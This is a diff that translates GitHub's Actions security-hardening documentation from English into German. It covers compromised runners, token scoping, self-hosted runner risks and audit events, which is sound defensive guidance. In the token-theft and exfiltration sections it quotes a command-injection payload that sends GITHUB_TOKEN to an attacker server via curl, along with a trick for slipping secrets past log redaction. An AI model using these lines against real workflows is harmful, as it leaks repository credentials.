+{% data reusables.actions.workflow-pr-approval-permissions-intro %} Wenn du Workflows oder anderen Automatisierungen erlaubst, {% ifversion allow-actions-to-approve-pr-with-ent-repo %} Pull Requests zu erstellen oder {% endif %}zu genehmigen, kann dies ein Sicherheitsrisiko darstellen, falls der Pull Request ohne angemessene Aufsicht gemergt wird.
 
-For more information on how to configure this setting, see {% ifversion allow-actions-to-approve-pr-with-ent-repo %}{% ifversion ghes or ghec or ghae %}"[Enforcing policies for {% data variables.product.prodname_actions %} in your enterprise](/enterprise-cloud@latest/admin/policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise#preventing-github-actions-from-creating-or-approving-pull-requests)",{% endif %}{% endif %} "[Disabling or limiting {% data variables.product.prodname_actions %} for your organization](/github/setting-up-and-managing-organizations-and-teams/disabling-or-limiting-github-actions-for-your-organization#preventing-github-actions-from-{% ifversion allow-actions-to-approve-pr-with-ent-repo %}creating-or-{% endif %}approving-pull-requests)"{% ifversion allow-actions-to-approve-pr-with-ent-repo %}, and "[Managing {% data variables.product.prodname_actions %} settings for a repository](/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#preventing-github-actions-from-creating-or-approving-pull-requests)"{% endif %}.
+Weitere Informationen zum Konfigurieren dieser Einstellung findest du unter {% ifversion allow-actions-to-approve-pr-with-ent-repo %}{% ifversion ghes or ghec or ghae %}[Erzwingen von Richtlinien für {% data variables.product.prodname_actions %} in deinem Unternehmen](/enterprise-cloud@latest/admin/policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise#preventing-github-actions-from-creating-or-approving-pull-requests),{% endif %}{% endif %} [Deaktivieren oder Begrenzen von {% data variables.product.prodname_actions %} für deine Organisation](/github/setting-up-and-managing-organizations-and-teams/disabling-or-limiting-github-actions-for-your-organization#preventing-github-actions-from-{% ifversion allow-actions-to-approve-pr-with-ent-repo %}creating-or-{% endif %}approving-pull-requests){% ifversion allow-actions-to-approve-pr-with-ent-repo %} und [Verwalten von {% data variables.product.prodname_actions %}-Einstellungen für ein Repository](/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#preventing-github-actions-from-creating-or-approving-pull-requests){% endif %}.
 {% endif %}
 
-## Using OpenSSF Scorecards to secure workflows
+## Verwenden von OpenSSF-Scorecards, um Workflows zu schützen
 
-[Scorecards](https://github.com/ossf/scorecard) is an automated security tool that flags risky supply chain practices. You can use the [Scorecards action](https://github.com/marketplace/actions/ossf-scorecard-action) and [starter workflow](https://github.com/actions/starter-workflows) to follow best security practices. Once configured, the Scorecards action runs automatically on repository changes, and alerts developers about risky supply chain practices using the built-in code scanning experience. The Scorecards project runs a number of checks, including script injection attacks, token permissions, and pinned actions.
+[Scorecards](https://github.com/ossf/scorecard) sind ein automatisiertes Sicherheitstool, mit dem Lieferkettenaktionen gekennzeichnet werden, die ein Risiko bergen. Du kannst die [Scorecards-Aktion](https://github.com/marketplace/actions/ossf-scorecard-action) und den [Startworkflow](https://github.com/actions/starter-workflows) verwenden, um bewährte Sicherheitsmethoden anzuwenden. Nach der Konfiguration wird die Scorecards-Aktion bei Repositoryänderungen automatisch ausgeführt, und Entwickler*innen werden mithilfe der integrierten Codeüberprüfung über riskante Lieferkettenaktionen informiert. Das Scorecards-Projekt führt eine Reihe von Prüfungen aus, mit denen u. a. Angriffe durch Skripteinschleusung, Tokenberechtigungen und angeheftete Aktionen ermittelt bzw. untersucht werden.
 
-## Potential impact of a compromised runner
+## Potenzielle Auswirkungen eines kompromittierten Runners
 
-These sections consider some of the steps an attacker can take if they're able to run malicious commands on a {% data variables.product.prodname_actions %} runner.
+In diesen Abschnitten werden einige Schritte beschrieben, die Angreifer*innen ausführen können, wenn sie böswillige Befehle in einem {% data variables.product.prodname_actions %}-Runner ausführen können.
 
 {% note %}
 
-**Note:** {% data variables.product.prodname_dotcom %}-hosted runners do not scan for malicious code downloaded by a user during their job, such as a compromised third party library.
+**Hinweis:** Von {% data variables.product.prodname_dotcom %} gehostete Runner führen keine Scans nach schädlichem Code (z. B. einer kompromittierten Drittanbieterbibliothek) durch, der während des Auftrags von Benutzer*innen heruntergeladen wurde.
 
 {% endnote %}
 
-### Accessing secrets
+### Zugreifen auf Geheimnisse
 
-Workflows triggered using the `pull_request` event have read-only permissions and have no access to secrets. However, these permissions differ for various event triggers such as `issue_comment`, `issues` and `push`, where the attacker could attempt to steal repository secrets or use the write permission of the job's [`GITHUB_TOKEN`](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token).
+Workflows, die mit dem `pull_request`-Ereignis ausgelöst werden, verfügen ausschließlich über Leseberechtigungen und haben keinen Zugriff auf Geheimnisse. Diese Berechtigungen variieren jedoch für verschiedene Ereignisauslöser wie `issue_comment`, `issues` und `push`, bei denen Angreifer*innen versuchen könnten, Repositorygeheimnisse auszuspähen oder die Schreibberechtigung des [`GITHUB_TOKEN`](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token) eines Auftrags zu verwenden.
 
-- If the secret or token is set to an environment variable, it can be directly accessed through the environment using `printenv`.
-- If the secret is used directly in an expression, the generated shell script is stored on-disk and is accessible.
-- For a custom action, the risk can vary depending on how a program is using the secret it obtained from the argument:
+- Wenn das Geheimnis oder Token auf eine Umgebungsvariable festgelegt ist, kann mithilfe von `printenv` direkt über die Umgebung darauf zugegriffen werden.
+- Wird das Geheimnis direkt in einem Ausdruck verwendet, wird das generierte Shellskript auf dem Datenträger gespeichert, und es kann darauf zugegriffen werden.
+- Bei benutzerdefinierten Aktionen kann das Risiko abhängig davon variieren, wie ein Programm das Geheimnis nutzt, das aus dem Argument abgerufen wurde:
 
   {% raw %}
   ```
@@ -237,154 +240,151 @@ Workflows triggered using the `pull_request` event have read-only permissions an
   ```
   {% endraw %}
 
-Although {% data variables.product.prodname_actions %} scrubs secrets from memory that are not referenced in the workflow (or an included action), the `GITHUB_TOKEN` and any referenced secrets can be harvested by a determined attacker.
+Wenngleich {% data variables.product.prodname_actions %} ein Scrubbing für Geheimnisse aus dem Arbeitsspeicher ausführt, auf die nicht im Workflow verwiesen wird bzw. die nicht in einer Aktion enthalten sind, können `GITHUB_TOKEN` und Geheimnisse, auf die verwiesen wird, von Angreifer*innen ausgespäht werden.
 
-### Exfiltrating data from a runner
+### Exfiltrieren von Daten aus einem Runner
 
-An attacker can exfiltrate any stolen secrets or other data from the runner. To help prevent accidental secret disclosure, {% data variables.product.prodname_actions %} [automatically redact secrets printed to the log](/actions/reference/encrypted-secrets#accessing-your-secrets), but this is not a true security boundary because secrets can be intentionally sent to the log. For example, obfuscated secrets can be exfiltrated using `echo ${SOME_SECRET:0:4}; echo ${SOME_SECRET:4:200};`. In addition, since the attacker may run arbitrary commands, they could use HTTP requests to send secrets or other repository data to an external server.
+Angreifer*innen können sämtliche gestohlenen Geheimnisse oder andere Daten aus dem Runner exfiltrieren. Damit die versehentliche Offenlegung von Geheimnissen verhindert wird, führt {% data variables.product.prodname_actions %} eine [automatische Bearbeitung von Geheimnissen durch, die im Protokoll ausgegeben werden](/actions/reference/encrypted-secrets#accessing-your-secrets). Dies ist jedoch kein wirklicher Schutz, da die Geheimnisse absichtlich an das Protokoll gesendet werden können. So können verschleierte Geheimnisse beispielweise mithilfe von `echo ${SOME_SECRET:0:4}; echo ${SOME_SECRET:4:200};` exfiltriert werden. Und da Angreifer*innen auch beliebige Befehle ausführen können, können sie Geheimnisse oder andere Repositorydaten mithilfe von HTTP-Anforderungen an einen externen Server senden.
 
-### Stealing the job's `GITHUB_TOKEN`
+### Diebstahl des `GITHUB_TOKEN` eines Auftrags
 
-It is possible for an attacker to steal a job's `GITHUB_TOKEN`. The {% data variables.product.prodname_actions %} runner automatically receives a generated `GITHUB_TOKEN` with permissions that are limited to just the repository that contains the workflow, and the token expires after the job has completed. Once expired, the token is no longer useful to an attacker. To work around this limitation, they can automate the attack and perform it in fractions of a second by calling an attacker-controlled server with the token, for example: `a"; set +e; curl http://example.com?token=$GITHUB_TOKEN;#`.
+Es ist möglich, dass Angreifer*innen das `GITHUB_TOKEN` eines Auftrags stehlen. Der {% data variables.product.prodname_actions %}-Runner empfängt automatisch ein generiertes `GITHUB_TOKEN` mit Berechtigungen, die auf das Repository beschränkt sind, das den Workflow enthält. Nachdem der Auftrag abgeschlossen wurde, verliert das Token seine Gültigkeit. Das abgelaufene Token bietet keinen Nutzen für Angreifer*innen. Zur Umgehung dieser Einschränkung kann der Angriff automatisiert und in Sekundenbruchteilen ausgeführt werden, indem ein vom Angreifer oder von der Angreiferin gesteuerter Server mit dem Token aufgerufen wird. Beispiel: `a"; set +e; curl http://example.com?token=$GITHUB_TOKEN;#`.
 
-### Modifying the contents of a repository
+### Ändern der Repositoryinhalte
 
-The attacker server can use the {% ifversion fpt or ghec %}{% data variables.product.prodname_dotcom %}{% else %}{% data variables.product.product_name %}{% endif %} API to [modify repository content](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token), including releases, if the assigned permissions of `GITHUB_TOKEN` [are not restricted](/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token).
+Der Angreiferserver kann die {% ifversion fpt or ghec %}{% data variables.product.prodname_dotcom %}{% else %}{% data variables.product.product_name %}{% endif %}-API verwenden, um [Repositoryinhalte zu ändern](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token). Dies umfasst auch die Versionen, wenn die zugewiesenen Berechtigungen von `GITHUB_TOKEN`[nicht eingeschränkt sind](/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token).
 
-## Considering cross-repository access
+## Grundlegendes zum repositoryübergreifenden Zugriff
 
-{% data variables.product.prodname_actions %} is intentionally scoped for a single repository at a time. The `GITHUB_TOKEN` grants the same level of access as a write-access user, because any write-access user can access this token by creating or modifying a workflow file, elevating the permissions of the `GITHUB_TOKEN` if necessary. Users have specific permissions for each repository, so allowing the `GITHUB_TOKEN` for one repository to grant access to another would impact the {% data variables.product.prodname_dotcom %} permission model if not implemented carefully. Similarly, caution must be taken when adding {% data variables.product.prodname_dotcom %} authentication tokens to a workflow, because this can also affect the {% data variables.product.prodname_dotcom %} permission model by inadvertently granting broad access to collaborators.
+Die Berechtigungen von {% data variables.product.prodname_actions %} sind bewusst für nur jeweils ein Repository ausgelegt. Mit `GITHUB_TOKEN` wird die gleiche Zugriffsstufe erteilt wie die von Benutzer*innen mit Schreibzugriff. Denn alle Benutzer*innen mit Schreibzugriff können auf dieses Token zugreifen, indem du eine Workflowdatei erstellst oder änderst und dabei die Berechtigungen von `GITHUB_TOKEN` bei Bedarf erhöhst. Benutzer*innen verfügen über spezifische Berechtigungen für die einzelnen Repositorys. Wenn das `GITHUB_TOKEN` für ein Repository Zugriff auf ein anderes Repository ermöglichen würde, könnte sich dies bei nicht sorgfältiger Implementierung daher auf das {% data variables.product.prodname_dotcom %}-Berechtigungsmodell auswirken. Gleichermaßen ist Vorsicht geboten, wenn {% data variables.product.prodname_dotcom %}-Authentifizierungstoken zu einem Workflow hinzugefügt werden. Denn auch dies kann sich auf das {% data variables.product.prodname_dotcom %}-Berechtigungsmodell auswirken, wenn Projektmitarbeiter*innen unbeabsichtigterweise umfangreiche Zugriffsberechtigungen zugewiesen werden.
 
-We have [a plan on the {% data variables.product.prodname_dotcom %} roadmap](https://github.com/github/roadmap/issues/74) to support a flow that allows cross-repository access within {% data variables.product.product_name %}, but this is not yet a supported feature. Currently, the only way to perform privileged cross-repository interactions is to place a {% data variables.product.prodname_dotcom %} authentication token or SSH key as a secret within the workflow. Because many authentication token types do not allow for granular access to specific resources, there is significant risk in using the wrong token type, as it can grant much broader access than intended.
+Wir verfügen über [einen Plan in der {% data variables.product.prodname_dotcom %}-Roadmap](https://github.com/github/roadmap/issues/74) zur Unterstützung eines Flows, der einen repositoryübergreifenden Zugriff innerhalb von {% data variables.product.product_name %} ermöglicht. Dies ist jedoch noch kein unterstütztes Feature. Derzeit besteht die einzige Möglichkeit für privilegierte repositoryübergreifende Interaktionen darin, ein {% data variables.product.prodname_dotcom %}-Authentifizierungstoken oder einen SSH-Schlüssel als Geheimnis innerhalb des Workflows einzusetzen. Da viele Authentifizierungstokentypen keinen differenzierten Zugriff auf bestimmte Ressourcen ermöglichen, besteht ein erhebliches Risiko durch die Verwendung des falschen Tokentyps, mit dem gegebenenfalls wesentlich umfangreichere Zugriffsberechtigungen zugewiesen werden als beabsichtigt.
 
-This list describes the recommended approaches for accessing repository data within a workflow, in descending order of preference:
+In dieser Liste sind die empfohlenen Vorgehensweisen für den Zugriff auf Repositorydaten innerhalb eines Workflows in absteigender Präferenzreihenfolge aufgeführt:
 
-1. **The `GITHUB_TOKEN`**
-    -  This token is intentionally scoped to the single repository that invoked the workflow, and can have the same level of access as a write-access user on the repository. The token is created before each job begins and expires when the job is finished. For more information, see "[Authenticating with the GITHUB_TOKEN](/actions/configuring-and-managing-workflows/authenticating-with-the-github_token)."
-    - The `GITHUB_TOKEN` should be used whenever possible.
-2. **Repository deploy key**
-    - Deploy keys are one of the only credential types that grant read or write access to a single repository, and can be used to interact with another repository within a workflow. For more information, see "[Managing deploy keys](/developers/overview/managing-deploy-keys#deploy-keys)."
-    - Note that deploy keys can only clone and push to the repository using Git, and cannot be used to interact with the REST or GraphQL API, so they may not be appropriate for your requirements.
-3. **{% data variables.product.prodname_github_app %} tokens**
-    - {% data variables.product.prodname_github_apps %} can be installed on select repositories, and even have granular permissions on the resources within them. You could create a {% data variables.product.prodname_github_app %} internal to your organization, install it on the repositories you need access to within your workflow, and authenticate as the installation within your workflow to access those repositories.
-4. **{% data variables.product.pat_generic %}s**
-    - You should never use a {% data variables.product.pat_v1 %}. These tokens grant access to all repositories within the organizations that you have access to, as well as all personal repositories in your personal account. This indirectly grants broad access to all write-access users of the repository the workflow is in.
-    - If you do use a {% data variables.product.pat_generic %}, you should never use a {% data variables.product.pat_generic %} from your own account. If you later leave an organization, workflows using this token will immediately break, and debugging this issue can be challenging. Instead, you should use a {% ifversion pat-v2%}{% data variables.product.pat_v2 %}s{% else %}{% data variables.product.pat_generic %}s{% endif %} for a new account that belongs to your organization and that is only granted access to the specific repositories that are needed for the workflow. Note that this approach is not scalable and should be avoided in favor of alternatives, such as deploy keys.
-5. **SSH keys on a personal account**
-    - Workflows should never use the SSH keys on a personal account. Similar to {% data variables.product.pat_v1_plural %}, they grant read/write permissions to all of your personal repositories as well as all the repositories you have access to through organization membership.  This indirectly grants broad access to all write-access users of the repository the workflow is in. If you're intending to use an SSH key because you only need to perform repository clones or pushes, and do not need to interact with public APIs, then you should use individual deploy keys instead.
+1. **`GITHUB_TOKEN`**
+    -  Dieses Token ist bewusst auf das eine Repository beschränkt, das den Workflow aufgerufen hat, und kann dieselbe Zugriffsstufe wie Benutzer*innen mit Schreibzugriff auf das Repository aufweisen. Das Token wird erstellt, bevor die einzelnen Aufträge beginnen, und läuft ab, wenn ein Auftrag abgeschlossen ist. Weitere Informationen findest du unter [Authenticating with the GITHUB_TOKEN](/actions/configuring-and-managing-workflows/authenticating-with-the-github_token) („Authentifizieren mit dem GITHUB_TOKEN“).
+    - `GITHUB_TOKEN` sollte wann immer möglich verwendet werden.
+2. **Bereitstellungsschlüssel für Repositorys**
+    - Bereitstellungsschlüssel sind einer der einzigen Anmeldeinformationstypen, die Lese- oder Schreibzugriff auf ein einzelnes Repository gewähren. Diese Schlüssel können für die Interaktion mit einem anderen Repository innerhalb eines Workflows verwendet werden. Weitere Informationen findest du unter [Managing deploy keys](/developers/overview/managing-deploy-keys#deploy-keys) („Verwalten von Bereitstellungsschlüsseln“).
+    - Beachte, dass Bereitstellungsschlüssel nur mit Git im Repository geklont bzw. an das Repository gepusht und nicht für die Interaktion mit der REST- oder GraphQL-API verwendet werden können. Aus diesem Grund eignen sie sich möglicherweise nicht für deine Anforderungen.
+3. **{% data variables.product.prodname_github_app %}-Token**
+    - {% data variables.product.prodname_github_apps %} kann in ausgewählten Repositorys installiert werden, und es können sogar differenzierte Berechtigungen für die Ressourcen innerhalb dieser Repositorys zugewiesen werden. Du kannst eine interne {% data variables.product.prodname_github_app %} für deine Organisation erstellen, diese in den Repositorys installieren, auf die du in deinem Workflow zugreifen musst, und sich als die Installation innerhalb deines Workflows authentifizieren, um auf diese Repositorys zuzugreifen.
+4. **{% data variables.product.pat_generic %}**
+    - Du solltest niemals ein {% data variables.product.pat_v1 %} verwenden. Diese Token gewähren Zugriff auf alle Repositorys innerhalb der Organisationen, auf die du Zugriff hast, sowie auf alle persönlichen Repositorys in deinem persönlichen Konto. Dadurch werden indirekt umfangreiche Zugriffsberechtigungen für alle Schreibzugriffsbenutzer*innen des Repositorys gewährt, in dem sich der Workflow befindet.
+    - Wenn du ein {% data variables.product.pat_generic %} verwendest, solltest du niemals ein {% data variables.product.pat_generic %} deines eigenen Kontos verwenden. Wenn du eine Organisation zu einem späteren Zeitpunkt verlässt, treten bei Workflows mit diesem Token umgehend Probleme auf, und das Debuggen kann schwierig sein. Stattdessen solltest du ein {% ifversion pat-v2%}{% data variables.product.pat_v2 %}{% else %}{% data variables.product.pat_generic %}{% endif %} eines neuen Kontos verwenden, das deiner Organisation gehört und dem nur Zugriff auf die Repositorys erteilt wird, die für diesen Workflow benötigt werden. Beachte, dass dieser Ansatz nicht skalierbar ist und stattdessen Alternativen wie Bereitstellungsschlüssel bevorzugt werden sollten.
+5. **SSH-Schlüssel für ein persönliches Konto**
+    - Workflows dürfen die SSH-Schlüssel niemals für ein persönliches Konto verwenden. Diese sind mit {% data variables.product.pat_v1_plural %} vergleichbar und gewähren Lese-/Schreibberechtigungen für alle deine persönlichen Repositorys sowie alle Repositorys, auf die du über die Organisationsmitgliedschaft zugreifen kannst.  Dadurch werden indirekt umfangreiche Zugriffsberechtigungen für alle Schreibzugriffsbenutzer*innen des Repositorys gewährt, in dem sich der Workflow befindet. Wenn du beabsichtigst, einen SSH-Schlüssel zu verwenden, weil du lediglich Klon- oder Pushvorgänge für ein Repository durchführst und nicht mit öffentlichen APIs interagieren müssen, solltest du stattdessen einzelne Bereitstellungsschlüssel verwenden.
 
-## Hardening for self-hosted runners
+## Härtung für selbstgehostete Runner
 
-{% ifversion fpt or ghec %}
-**{% data variables.product.prodname_dotcom %}-hosted** runners execute code within ephemeral and clean isolated virtual machines, meaning there is no way to persistently compromise this environment, or otherwise gain access to more information than was placed in this environment during the bootstrap process.
+In {% ifversion fpt or ghec %} **{% data variables.product.prodname_dotcom %} gehostete** Runner führen Code innerhalb von kurzlebigen, bereinigten isolierten VMs aus. Diese Art von Umgebung kann also nicht dauerhaft kompromittiert werden. Auch ist kein Zugriff auf Informationen möglich, die über die Informationen hinausgehen, die während des Bootstrap-Prozesses in dieser Umgebung platziert wurden.
 {% endif %}
 
-{% ifversion fpt or ghec %}**Self-hosted**{% elsif ghes or ghae %}Self-hosted{% endif %} runners for {% data variables.product.product_name %} do not have guarantees around running in ephemeral clean virtual machines, and can be persistently compromised by untrusted code in a workflow.
+{% ifversion fpt or ghec %}**Selbstgehostete**{% elsif ghes or ghae %}Selbstgehostete{% endif %} Runner für {% data variables.product.product_name %} bieten keine Garantien bezüglich der Ausführung in kurzlebigen bereinigten VMs und können durch nicht vertrauenswürdigen Code in einem Workflow dauerhaft gefährdet werden.
 
-{% ifversion fpt or ghec %}As a result, self-hosted runners should almost [never be used for public repositories](/actions/hosting-your-own-runners/about-self-hosted-runners#self-hosted-runner-security) on {% data variables.product.product_name %}, because any user can open pull requests against the repository and compromise the environment. Similarly, be{% elsif ghes or ghae %}Be{% endif %} cautious when using self-hosted runners on private or internal repositories, as anyone who can fork the repository and open a pull request (generally those with read access to the repository) are able to compromise the self-hosted runner environment, including gaining access to secrets and the `GITHUB_TOKEN` which, depending on its settings, can grant write access to the repository. Although workflows can control access to environment secrets by using environments and required reviews, these workflows are not run in an isolated environment and are still susceptible to the same risks when run on a self-hosted runner.
+{% ifversion fpt or ghec %}Folglich sollten selbstgehostete Runner praktisch [nie für öffentliche Repositorys](/actions/hosting-your-own-runners/about-self-hosted-runners#self-hosted-runner-security) in {% data variables.product.product_name %} verwendet werden, da beliebige Benutzer*innen Pull Requests für das Repository aufrufen und die Umgebung gefährden können. Gehe ebenfalls{% elsif ghes or ghae %}Gehe{% endif %} mit Bedacht vor, wenn du selbstgehostete Runner für private oder interne Repositorys verwendest. In diesem Fall können alle Benutzer*innen, die das Repository forken und Pull Requests starten können (üblicherweise Benutzer*innen mit Lesezugriff auf das Repository), die selbstgehostete Runnerumgebung kompromittieren. Dabei kann u. a. auf Geheimnisse und das `GITHUB_TOKEN` zugegriffen werden, über das abhängig von den Einstellungen Schreibzugriff auf das Repository gewährt werden kann. Wenngleich der Zugriff auf Umgebungsgeheimnisse in Workflows durch die Verwendung von Umgebungen und erforderlichen Prüfungen gesteuert werden kann, werden diese Workflows nicht in einer isolierten Umgebung ausgeführt. Folglich müssen bei Ausführung in einem selbstgehosteten Runner dieselben Risiken berücksichtigt werden.
 
-When a self-hosted runner is defined at the organization or enterprise level, {% data variables.product.product_name %} can schedule workflows from multiple repositories onto the same runner. Consequently, a security compromise of these environments can result in a wide impact. To help reduce the scope of a compromise, you can create boundaries by organizing your self-hosted runners into separate groups. You can restrict what {% ifversion restrict-groups-to-workflows %}workflows, {% endif %}organizations and repositories can access runner groups. For more information, see "[Managing access to self-hosted runners using groups](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups)."
+Wenn ein selbstgehosteter Runner auf Organisations- oder Unternehmensebene definiert wird, kann {% data variables.product.product_name %} Workflows aus mehreren Repositorys innerhalb desselben Runners planen. Sicherheitslücken oder Angriffe in diesen Umgebungen können also weitreichende Auswirkungen haben. Indem du deine selbstgehosteten Runner in separaten Gruppen organisierst, lässt sich der Umfang dieser Auswirkungen beschränken. Dabei kannst du einschränken, welche {% ifversion restrict-groups-to-workflows %}Workflows, {% endif %}Organisationen und Repositorys auf Runnergruppen zugreifen können. Weitere Informationen findest du unter [Verwalten des Zugriffs auf selbstgehostete Runner mithilfe von Gruppen](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups).
 
-You should also consider the environment of the self-hosted runner machines:
-- What sensitive information resides on the machine configured as a self-hosted runner? For example, private SSH keys, API access tokens, among others.
-- Does the machine have network access to sensitive services? For example, Azure or AWS metadata services. The amount of sensitive information in this environment should be kept to a minimum, and you should always be mindful that any user capable of invoking workflows has access to this environment.
+Außerdem solltest du die Umgebung der Computer des selbstgehosteten Runners berücksichtigen:
+- Welche vertraulichen Informationen befinden sich auf dem Computer, der als selbstgehosteter Runner konfiguriert ist? Diese Informationen können z. B. private SSH-Schlüssel, API-Zugriffstoken usw. umfassen.
+- Verfügt der Computer über Netzwerkzugriff auf vertrauliche Dienste? Dazu können z. B. Azure- oder AWS-Metadatendienste zählen. Die Menge an vertraulichen Informationen in dieser Umgebung sollte auf ein Minimum beschränkt werden. Du solltest immer bedenken, dass alle Benutzer*innen, die Workflows aufrufen können, Zugriff auf diese Umgebung haben.
 
-Some customers might attempt to partially mitigate these risks by implementing systems that automatically destroy the self-hosted runner after each job execution. However, this approach might not be as effective as intended, as there is no way to guarantee that a self-hosted runner only runs one job. Some jobs will use secrets as command-line arguments which can be seen by another job running on the same runner, such as `ps x -w`. This can lead to secret leakages.
+Einige Kunden versuchen möglicherweise, diese Risiken zu mindern, indem sie Systeme implementieren, die den selbstgehosteten Runner nach jeder Auftragsausführung automatisch zerstören. Dieser Ansatz ist jedoch gegebenenfalls nicht so effektiv wie gewünscht, da nicht sichergestellt werden kann, dass ein selbstgehosteter Runner nur einen Auftrag ausführt. Einige Aufträge verwenden Geheimnisse als Befehlszeilenargumente, die für einen anderen Auftrag sichtbar sind, der im selben Runner ausgeführt wird (z. B. `ps x -w`). Folglich kann es zur Offenlegung von Geheimnissen kommen.
 
-### Planning your management strategy for self-hosted runners
+### Planen deiner Verwaltungsstrategie für selbstgehostete Runner
 
-A self-hosted runner can be added to various levels in your {% data variables.product.prodname_dotcom %} hierarchy: the enterprise, organization, or repository level. This placement determines who will be able to manage the runner:
+Selbstgehostete Runner können auf verschiedenen Ebenen in deiner {% data variables.product.prodname_dotcom %}-Hierarchie hinzugefügt werden: auf Unternehmens-, Organisations- oder Repositoryebene. Durch diese Platzierung wird festgelegt, wer einen Runner verwalten kann:
 
-**Centralized management:**
-  - If you plan to have a centralized team own the self-hosted runners, then the recommendation is to add your runners at the highest mutual organization or enterprise level. This gives your team a single location to view and manage your runners.
-  - If you only have a single organization, then adding your runners at the organization level is effectively the same approach, but you might encounter difficulties if you add another organization in the future.
+**Zentrale Verwaltung:**
+  - Wenn ein zentrales Team Besitzer der selbstgehosteten Runner sein soll, solltest du deine Runner auf der höchsten gemeinsamen Organisations- oder Unternehmensebene hinzuzufügen. Dadurch kann dein Team deine Runner in einer zentralen Ansicht anzeigen und verwalten.
+  - Wenn du nur über eine einzige Organisation verfügst, ist das Hinzufügen deiner Runner auf Organisationsebene der gleiche Ansatz. Dabei kann es jedoch zu Problemen kommen, wenn du zu einem späteren Zeitpunkt eine weitere Organisation hinzufügst.
 
-**Decentralized management:**
-  - If each team will manage their own self-hosted runners, then the recommendation is to add the runners at the highest level of team ownership. For example, if each team owns their own organization, then it will be simplest if the runners are added at the organization level too.
-  - You could also add runners at the repository level, but this will add management overhead and also increases the numbers of runners you need, since you cannot share runners between repositories.
+**Dezentrale Verwaltung:**
+  - Wenn jedes Team seine eigenen selbstgehosteten Runner verwalten soll, sollten die Runner auf der höchsten Ebene des Teambesitzes hinzugefügt werden. Beispiel: Wenn jedes Team über eine eigene Organisation verfügt, ist es am einfachsten, die Runner ebenfalls auf Organisationsebene hinzuzufügen.
+  - Die Runner können auch auf Repositoryebene hinzugefügt werden. Da Runner in diesem Fall jedoch nicht von mehreren Repositorys gleichzeitig verwendet werden können, erhöht sich der Verwaltungsaufwand, und du benötigst eine größere Anzahl von Runnern.
 
 {% ifversion fpt or ghec or ghes > 3.4 %}
-### Authenticating to your cloud provider
+### Authentifizieren bei deinem Cloudanbieter
 
-If you are using {% data variables.product.prodname_actions %} to deploy to a cloud provider, or intend to use HashiCorp Vault for secret management, then its recommended that you consider using OpenID Connect to create short-lived, well-scoped access tokens for your workflow runs. For more information, see "[About security hardening with OpenID Connect](/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect)."
+Wenn du {% data variables.product.prodname_actions %} für die Bereitstellung bei einem Cloudanbieter verwendest oder beabsichtigst, HashiCorp Vault für die Verwaltung von Geheimnissen einzusetzen, solltest du die Verwendung von OpenID Connect in Betracht ziehen, um kurzlebige Zugriffstoken mit sorgfältig definiertem Gültigkeitsbereich für deine Workflowausführungen zu erstellen. Weitere Informationen findest du unter [About security hardening with OpenID Connect](/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect) („Informationen zur Sicherheitshärtung mit OpenID Connect“).
 
 {% endif %}
 
-## Auditing {% data variables.product.prodname_actions %} events
+## Überwachen von {% data variables.product.prodname_actions %}-Ereignissen
 
-You can use the audit log to monitor administrative tasks in an organization. The audit log records the type of action, when it was run, and which personal account performed the action.
+Über das Überwachungsprotokoll kannst du administrative Aufgaben in einer Organisation überwachen. Das Überwachungsprotokoll zeichnet die Art der Aktion, den Zeitpunkt der Ausführung sowie das persönliche Konto auf, das die Aktion ausgeführt hat.
 
-For example, you can use the audit log to track the `org.update_actions_secret` event, which tracks changes to organization secrets:
-  ![Audit log entries](/assets/images/help/repository/audit-log-entries.png)
+So kannst du das Überwachungsprotokoll z. B. zum Aufzeichnen des `org.update_actions_secret`-Ereignisses verwenden, mit dem sich Änderungen an Organisationsgeheimnissen nachverfolgen lassen: ![Überwachungsprotokolleinträge](/assets/images/help/repository/audit-log-entries.png)
 
-The following tables describe the {% data variables.product.prodname_actions %} events that you can find in the audit log. For more information on using the audit log, see
-"[Reviewing the audit log for your organization](/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#searching-the-audit-log)" and "[Reviewing audit logs for your enterprise](/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise)."
+In der folgenden Tabelle sind die {% data variables.product.prodname_actions %}-Ereignisse beschrieben, die im Überwachungsprotokoll enthalten sind. Weitere Informationen zur Verwendung des Überwachungsprotokolls findest du unter [Reviewing the audit log for your organization](/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#searching-the-audit-log) („Überprüfen des Überwachungsprotokolls für deine Organisation“) und [Reviewing audit logs for your enterprise](/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise) („Überprüfen der Überwachungsprotokolle für dein Unternehmen“).
 
 {% ifversion fpt or ghec %}
-### Events for environments
+### Ereignisse für Umgebungen
 
-| Action | Description
+| Aktion | BESCHREIBUNG
 |------------------|-------------------
-| `environment.create_actions_secret` | Triggered when a secret is created in an environment. For more information, see ["Environment secrets](/actions/reference/environments#environment-secrets)."
-| `environment.delete` | Triggered when an environment is deleted. For more information, see ["Deleting an environment](/actions/reference/environments#deleting-an-environment)."
-| `environment.remove_actions_secret` |  Triggered when a secret is removed from an environment. For more information, see ["Environment secrets](/actions/reference/environments#environment-secrets)."
-| `environment.update_actions_secret` | Triggered when a secret in an environment is updated. For more information, see ["Environment secrets](/actions/reference/environments#environment-secrets)."
+| `environment.create_actions_secret` | Wird ausgelöst, wenn ein Geheimnis in einer Umgebung erstellt wird. Weitere Informationen findest du unter [Environment secrets](/actions/reference/environments#environment-secrets) („Umgebungsgeheimnisse“).
